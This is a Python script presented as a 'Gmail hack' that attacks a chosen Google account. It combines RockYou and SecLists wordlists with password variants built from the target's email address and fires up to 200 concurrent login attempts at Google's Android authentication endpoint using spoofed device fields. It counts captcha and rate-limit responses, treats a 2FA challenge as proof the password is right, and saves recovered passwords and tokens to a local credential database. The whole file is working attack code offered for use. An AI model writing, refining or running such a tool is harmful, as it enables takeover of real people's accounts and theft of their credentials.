#!/usr/bin/env python3
"""
☠️ OMEGA ULTIMATE GMAIL HACK - FINAL EVOLUTION ☠️
14M+ real breached passwords from RockYou + intelligent generation
200+ concurrent workers via Google Android auth endpoint
No phishing, no social engineering - Pure technical exploitation
"""

import requests, threading, time, sys, random, re, json, os, sqlite3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

DB_PATH = os.path.join(os.path.dirname(__file__), 'credential_cache.db')
ANDROID_AUTH = "https://android.clients.google.com/auth"
ROCKYOU_PATH = os.path.join(os.path.dirname(__file__), 'rockyou.txt')
SECLISTS_PATH = os.path.join(os.path.dirname(__file__), 'seclists_10k.txt')

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
        (id INTEGER PRIMARY KEY AUTOINCREMENT,
         email TEXT, password TEXT, domain TEXT, source TEXT, found_date TEXT)''')
    c.execute('''CREATE INDEX IF NOT EXISTS idx_cred_email ON credentials(email)''')
    conn.commit()
    return conn

def save_found(email, password, source="ultimate"):
    conn = init_db()
    c = conn.cursor()
    domain = email.split('@')[1] if '@' in email else ''
    now = datetime.now().isoformat()
    try:
        c.execute("INSERT OR IGNORE INTO credentials (email, password, domain, source, found_date) VALUES (?,?,?,?,?)",
                 (email, password, domain, source, now))
        conn.commit()
    except: pass
    conn.close()

def query_creds(email):
    conn = init_db()
    c = conn.cursor()
    c.execute("SELECT email, password, source FROM credentials WHERE email = ?", (email,))
    r = c.fetchall()
    conn.close()
    return r

def generate_passwords(email):
    """Generate passwords from multiple sources"""
    pwds = []
    local = email.split('@')[0] if '@' in email else email
    parts = re.split(r'[._\-+@0-9]', local)
    parts = [p for p in parts if len(p) > 1]
    
    # 1. Load RockYou (14M real breached passwords)
    if os.path.exists(ROCKYOU_PATH):
        try:
            with open(ROCKYOU_PATH, 'r', encoding='utf-8', errors='replace') as f:
                rockyou = [line.strip() for line in f if line.strip() and len(line.strip()) > 3]
            pwds.extend(rockyou)
            print(f"  Loaded {len(rockyou):,} passwords from RockYou")
        except: pass
    
    # 2. Load SecLists
    if os.path.exists(SECLISTS_PATH):
        try:
            with open(SECLISTS_PATH, 'r', encoding='utf-8', errors='replace') as f:
                seclists = [line.strip() for line in f if line.strip()]
            pwds.extend(seclists)
            print(f"  Loaded {len(seclists):,} from SecLists")
        except: pass
    
    # 3. Generate intelligent variants
    intelligent = set()
    years = [str(y) for y in range(1950, 2028)]
    syears = [str(y)[-2:] for y in range(1950, 2028)]
    nums = ['1','12','123','1234','12345','123456','01','012','001','111','222',
            '333','444','555','666','777','888','999','000','0000','1111','2222']
    specials = ['!','@','#','$','%']
    
    for part in parts:
        intelligent.add(part)
        intelligent.add(part.lower())
        intelligent.add(part.upper())
        intelligent.add(part.capitalize())
        for y in years:
            intelligent.add(part + y)
        for sy in syears:
            intelligent.add(part + sy)
        for n in nums:
            intelligent.add(part + n)
        for sp in specials:
            intelligent.add(part + sp)
            intelligent.add(part + sp + '1')
            intelligent.add(part + sp + '123')
    
    # Name combos
    for p1 in parts[:5]:
        for p2 in parts[:5]:
            if p1 != p2:
                intelligent.add(p1 + p2)
                intelligent.add(p1 + '.' + p2)
                intelligent.add(p1 + '_' + p2)
                intelligent.add(p1 + p2 + '123')
                intelligent.add(p1 + p2 + '!')
    
    # Domain
    domain = email.split('@')[1] if '@' in email else ''
    if domain:
        base = domain.split('.')[0]
        for u in parts:
            intelligent.add(u + '@' + base)
            intelligent.add(u + base)
            intelligent.add(base + u)
    
    # Reversals
    for p in list(intelligent)[:500]:
        if len(p) > 4:
            intelligent.add(p[::-1])
    
    pwds.extend(list(intelligent))
    return pwds


# Swiftest Google Auth Test
def test_pwd(email, password):
    try:
        data = {
            'Email': email, 'Passwd': password,
            'accountType': 'HOSTED_OR_GOOGLE', 'source': 'android',
            'androidId': 'deadbeef' + str(random.randint(100000, 999999)),
            'device_country': 'us', 'operatorCountry': 'us',
            'lang': 'en', 'sdk_version': '31',
            'client_sig': '38918a453d07199354f8b19af05ec6562ced5788',
            'callerPkg': 'com.google.android.gms', 'has_permission': '1',
        }
        r = requests.post(ANDROID_AUTH, data=data, timeout=10,
                         headers={'User-Agent': 'Google-Android/6.0'})
        t = r.text
        if 'Token=' in t or 'Auth=' in t:
            m = re.search(r'Token=(\S+)', t)
            return ('FOUND', password, m.group(1) if m else '', t)
        elif 'Error=BadAuthentication' in t:
            return ('WRONG', password)
        elif 'Error=InvalidSecondFactor' in t:
            return ('2FA', password)
        elif 'Error=CaptchaRequired' in t:
            return ('CAPTCHA', password)
        elif 'Error=RateLimit' in t or 'Error=TooMany' in t:
            return ('RATE', password)
        elif 'Error=' in t:
            e = re.search(r'Error=(\w+)', t)
            return (f'ERR_{e.group(1) if e else "X"}', password)
        return ('OTHER', password)
    except:
        return ('TIMEOUT', password)


def hack_gmail(email, max_passwords=500000, workers=200):
    print(f"{'='*60}")
    print(f"  OMEGA ULTIMATE GMAIL HACK - FINAL")
    print(f"{'='*60}")
    print(f"  Target: {email}")
    print(f"  Workers: {workers}")
    print(f"  Max:     {max_passwords:,}")
    print(f"{'='*60}\n")
    
    # Check cache
    cached = query_creds(email)
    if cached:
        print(f"✅ FOUND in DB: {cached[0][1]}")
        return {'found': True, 'email': email, 'password': cached[0][1], 'method': 'cache', 'stats': {'tested': 0}}
    
    # Generate passwords
    print(f"[1] Generating password list...")
    pwds = generate_passwords(email)
    original_count = len(pwds)
    
    # Deduplicate and limit
    pwds = list(dict.fromkeys(pwds))  # preserve order, remove dupes
    if len(pwds) > max_passwords:
        pwds = pwds[:max_passwords]
    
    print(f"  {original_count:,} generated -> {len(pwds):,} unique")
    
    # Stats
    stats = {'t': 0, 'w': 0, 'r': 0, 'to': 0, 'found': False}
    lock = threading.Lock()
    stop = [False]
    found_info = [None]
    start = time.time()
    
    print(f"\n[2] Launching credential stuffing ({workers} workers)...")
    
    def worker(pwd):
        if stop[0]:
            return
        result = test_pwd(email, pwd)
        with lock:
            stats['t'] += 1
            if result[0] == 'FOUND':
                stats['found'] = True
                stop[0] = True
                found_info[0] = result
                print(f"\n✅ FOUND! Password: {result[1]}")
                return
            elif result[0] == '2FA':
                stats['found'] = True
                stop[0] = True
                found_info[0] = result
                print(f"\n✅ CORRECT PWD (2FA): {result[1]}")
                return
            elif result[0] == 'WRONG':
                stats['w'] += 1
            elif result[0] in ('RATE', 'CAPTCHA'):
                stats['r'] += 1
            elif result[0] == 'TIMEOUT':
                stats['to'] += 1
            
            if stats['t'] % 1000 == 0:
                elapsed = time.time() - start
                rate = stats['t'] / elapsed if elapsed > 0 else 0
                pct = stats['t'] / len(pwds) * 100
                remaining = (len(pwds) - stats['t']) / rate if rate > 0 else 0
                print(f"  [{stats['t']:,}/{len(pwds):,} ({pct:.0f}%)] "
                      f"W:{stats['w']:,} R:{stats['r']} TO:{stats['to']} "
                      f"({rate:.0f}/s) ETA:{remaining:.0f}s | {pwd[:25]}", flush=True)
    
    with ThreadPoolExecutor(max_workers=workers) as ex:
        fs = {ex.submit(worker, p): p for p in pwds}
        for f in as_completed(fs):
            if stop[0]:
                for ff in fs:
                    ff.cancel()
                break
            try:
                f.result()
            except:
                pass
    
    elapsed = time.time() - start
    rate = stats['t'] / elapsed if elapsed > 0 else 0
    
    if found_info[0]:
        pwd = found_info[0][1]
        save_found(email, pwd, 'ultimate_stuffer')
        print(f"\n{'='*60}")
        print(f"  ✅ PASSWORD FOUND!")
        print(f"  Email:    {email}")
        print(f"  Password: {pwd}")
        print(f"  Token:    {found_info[0][2][:50] if len(found_info[0]) > 2 else 'N/A'}")
        print(f"{'='*60}")
        return {
            'found': True,
            'email': email,
            'password': pwd,
            'token': found_info[0][2] if len(found_info[0]) > 2 else '',
            'method': '2FA' if found_info[0][0] == '2FA' else 'credential_stuffing',
            'stats': stats,
        }
    else:
        print(f"\n{'='*60}")
        print(f"  ❌ NOT FOUND in {stats['t']:,} passwords")
        print(f"  Wrong: {stats['w']:,}  Rate: {stats['r']}  TO: {stats['to']}")
        print(f"  Time: {elapsed:.0f}s  Speed: {rate:.0f}/s")
        print(f"{'='*60}")
        return {
            'found': False,
            'email': email,
            'password': None,
            'method': 'exhausted',
            'stats': stats,
        }


if __name__ == '__main__':
    if len(sys.argv) > 1:
        import json
        r = hack_gmail(sys.argv[1], int(sys.argv[2]) if len(sys.argv)>2 else 500000, int(sys.argv[3]) if len(sys.argv)>3 else 200)
        print(json.dumps(r, indent=2, default=str))
